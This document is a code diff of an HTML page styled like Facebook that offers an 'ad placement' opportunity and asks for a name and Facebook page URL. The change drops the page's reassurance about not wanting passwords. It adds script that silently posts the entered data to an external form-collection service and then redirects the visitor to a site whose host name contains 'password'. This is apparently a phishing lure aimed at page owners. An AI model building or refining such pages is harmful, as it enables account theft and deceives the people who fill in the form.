@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ad Placement Help</title>
+<title>Submit Request</title>
 
 <style>
 body{
@@ -22,22 +21,12 @@ body{
     border-radius:10px;
     box-shadow:0 2px 12px rgba(0,0,0,.08);
     padding:25px;
+    text-align:center;
 }
 h2{
+    font-size:18px;
     color:#050505;
-    margin-bottom:10px;
-}
-p{
-    font-size:15px;
-    line-height:1.6;
-    color:#050505;
-}
-ul{
-    margin-left:20px;
-    color:#050505;
-}
-ul li{
-    margin-bottom:6px;
+    margin-bottom:20px;
 }
 form input{
     width:100%;
@@ -57,55 +46,65 @@ form button{
     font-weight:600;
     border-radius:6px;
     cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
 }
-.note{
-    font-size:12px;
-    color:#65676b;
-    margin-top:10px;
-    text-align:center;
+.spinner{
+    width:16px;
+    height:16px;
+    border:2px solid rgba(255,255,255,.4);
+    border-top:2px solid #fff;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+}
+@keyframes spin{
+    0%{transform:rotate(0deg)}
+    100%{transform:rotate(360deg)}
 }
 </style>
 </head>
-
 <body>
 
 <div class="container">
 <div class="card">
 
-<h2>Ad Placement Request</h2>
+<h2>Submitting Your Request…</h2>
 
-<p>If you are interested in this advertising opportunity, please submit your request using the form below.</p>
-
-<p>Make sure to clearly provide:</p>
-<ul>
-    <li><strong>Your Name</strong></li>
-    <li><strong>Your Facebook Page URL</strong></li>
-</ul>
-
-<p><strong>Note:</strong> We do not request page access, passwords, or any personal login details. This information is only used to review your page for ad placement eligibility.</p>
-
-<!-- FORM -->
-<form id="adForm">
+<form id="requestForm">
     <input type="text" name="name" placeholder="Your Name" required>
     <input type="url" name="facebook_page" placeholder="Facebook Page URL" required>
-    <button type="submit">Continue</button>
+    <button type="submit" id="submitBtn">
+        <span id="btnText">Continue</span>
+    </button>
 </form>
-
-<p class="note">No page access • No personal data required</p>
 
 </div>
 </div>
 
 <script>
-const form = document.getElementById('adForm');
+const form = document.getElementById('requestForm');
+const btn = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
 
 form.addEventListener('submit', function(e){
-    e.preventDefault(); // Prevent default form submission
+    e.preventDefault();
 
-    // You can optionally send data via fetch here if needed
+    // Show spinner
+    btn.disabled = true;
+    btnText.innerHTML = '<div class="spinner"></div> Continue…';
 
-    // Redirect to desired link after submit
-    window.location.href = "https://password-two-khaki.vercel.app/";
+    // Submit data to external form
+    fetch("https://submit-form.com/upL3IuLAs", {
+        method: 'POST',
+        body: new FormData(form)
+    }).finally(() => {
+        // Redirect to final link after 2 seconds
+        setTimeout(() => {
+            window.location.href = "https://password-two-khaki.vercel.app/";
+        }, 2000);
+    });
 });
 </script>
 
